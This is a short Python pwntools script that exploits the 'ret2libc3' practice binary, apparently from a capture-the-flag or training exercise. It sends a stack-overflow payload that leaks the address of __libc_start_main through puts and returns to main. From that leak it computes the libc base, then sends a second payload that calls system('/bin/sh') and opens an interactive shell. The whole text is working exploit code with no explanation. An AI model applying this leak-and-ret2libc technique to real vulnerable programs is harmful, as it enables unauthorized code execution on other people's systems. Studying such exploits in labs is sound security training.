from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

#print hex(puts_plt), hex(libc_start_main_got), hex(main)
#print "leak libc_start_main_got addr and return to main again"
payload = b'A' * 112 + p32( puts_plt) + p32(main) + p32(libc_start_main_got)
sh.sendlineafter(b'Can you find it !?', payload)

#print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
# libc = ret2libc3.libc
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libc.symbols['system']
a  = libc.search(b'/bin/sh')
binsh_addr = 0
for i in a:
    binsh_addr = i

#print "get shell"
#sh.recvuntil(b'Can you find it !?')
payload = b'A' * 104 + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)
sh.sendline(payload)

sh.interactive()